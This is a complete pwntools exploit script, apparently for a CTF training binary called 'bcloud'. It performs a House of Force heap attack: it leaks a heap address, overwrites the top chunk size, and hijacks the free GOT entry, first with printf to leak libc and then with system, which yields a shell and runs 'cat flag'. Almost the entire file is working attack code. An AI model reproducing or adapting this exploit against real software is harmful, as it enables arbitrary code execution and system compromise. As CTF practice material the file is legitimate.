from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
p = process("./bcloud")
#p = remote("training.jinblack.it", 2016)
gdb.attach(p, '''
	#b *0x08048978
	b *0x08048a19 
	b *0x8048a8c''')
context.log_level = 'debug'

f = elf.ELF('./bcloud')
libc = elf.ELF('./libc-2.27.so')

raw_input("Wait")

readGot = 0x0804b00c
freeGot = 0x0804b014
atoiGot = 0x0804b03c
arrayDimNote = 0x0804b0a0
printfPlt = 0x080484d0

def insertName():
	p.recvuntil("Input your name:")
	p.send("A"*0x3f + "B")

def insertOrg():
	p.recvuntil("Org:")
	p.send("C"*0x40)

def insertHost():
	p.recvuntil("Host:")
	p.sendline("DDDD" + "EEEE" + p32(0xffffffff))

def newNote(size, content):
	p.sendline("1")
	p.recvuntil("content:")
	p.sendline("%d" % size)
	p.recvuntil("content:")
	if size > 0:
		p.sendline(content)

def editNote(id_, content):
	p.sendline("3")
	p.recvuntil("id:")
	p.sendline("%d" % id_)
	p.recvuntil("content:")
	p.sendline(content)

def deleteNote(id_):
	p.sendline("4")
	p.recvuntil("id:\n")
	p.sendline("%d" %id_)
	return u32(p.recv(4))

insertName()

p.recvuntil("B")
leak = u32(p.recv(4))
print "LEAK: %#x" % leak

insertOrg()
time.sleep(0.1)
insertHost() #sovrascrivo dimensione top_chunk con 0xffffffff

#leak address name buffer 		0x0804c160
#top_chunk address after org 	0x0804c258

heapBase = leak - 0x160
topChunk = heapBase + 0x25c
print "HeapBase: %#x" % heapBase
print "topChunk: %#x" % topChunk

toMalloc = arrayDimNote - topChunk - 18

newNote(toMalloc, "")

payload = p32(4)*10
payload += "\x00"*(0x0804b120 - 0x0804b0a0 - 10 - 30)
payload += p32(freeGot)
#payload += p32(freeGot)
#payload += "ls"
payload += p32(atoiGot)

newNote(len(payload), payload) #scrive partendo da arrayDimNote 0x0804b0a0
editNote(0, p32(printfPlt))

atoi_libc = deleteNote(1)
print "atoi_libc: %#x" % atoi_libc

libc_base = atoi_libc - libc.symbols['atoi']
systemAddr = libc_base + libc.symbols['system']
print "libc_base: %#x" % libc_base
print "systemAddr: %#x" % systemAddr

editNote(0, p32(systemAddr))
sh = "/bin/sh\x00"
ls = "ls"
cat_flag = "cat flag"
newNote(len(sh), sh)
newNote(len(cat_flag), cat_flag)
newNote(len(ls), ls)
deleteNote(2)

#p.recvuntil("id:\n")
#p.sendline("ls")


#prima di Deleted message ho f7e09b40 se deleto 1 --> atoi_libc
#prima di Deleted message ho 080484d0 se deleto 0
p.interactive()